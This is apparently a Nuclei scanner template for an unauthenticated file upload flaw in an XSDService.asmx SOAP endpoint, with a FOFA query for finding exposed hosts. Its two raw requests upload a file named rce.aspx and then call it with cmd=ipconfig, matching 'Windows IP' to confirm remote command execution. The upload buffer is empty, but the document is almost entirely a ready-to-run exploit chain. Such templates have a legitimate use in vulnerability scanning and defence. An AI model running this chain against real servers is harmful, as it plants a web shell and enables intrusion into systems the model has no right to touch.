id: XSDService-fileupload
info:
  name: XSDService.asmx - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="XSDService.asmx"
  tags: 2024,fileupload,asp

http:
  - raw:
      - |
        POST /XSDService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: length
        SOAPAction: "http://tempuri.org/UploadFile"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadFile xmlns="http://tempuri.org/">
              <filePath>2</filePath>
              <fileName>rce.aspx</fileName>
              <buffer></buffer>
              <Offset>1</Offset>
            </UploadFile>
          </soap:Body>
        </soap:Envelope>
      
      - |
        GET /Upload2015/2/rce.aspx?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
      
      - type: regex
        part: body_2
        regex:
          - "Windows IP"


